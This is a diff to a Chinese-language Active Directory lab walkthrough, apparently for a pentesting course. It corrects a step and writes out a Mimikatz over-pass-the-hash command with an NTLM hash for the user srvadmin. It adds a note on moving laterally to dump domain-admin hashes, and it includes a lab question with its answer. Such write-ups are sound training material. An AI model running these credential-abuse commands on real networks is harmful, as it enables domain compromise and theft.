@@ -1780,10 +1780,12 @@ mimikatz(powershell) # exit
 Bye!
 ```
 
-现在在dcorp-adminsrv机器上我们有了srvadmin的哈希，可以回到学习机器上使用Over pass the hash开启一个有域管理员权限的shell
+现在在dcorp-adminsrv机器上我们有了srvadmin的哈希，可以回到学习机器上使用Over pass the hash开启一个srvadmin的shell
 ```
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local  /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
 ```
+
+因为srvadmin可以横向到dcorp-mgmt,而dcorp-mgmt有与管理员的session，因此可以横向到dcorp-mgmt导出DA的NTML进行提权
 
 问题：Process using svcadmin as service account
 答案：sqlserver.exe
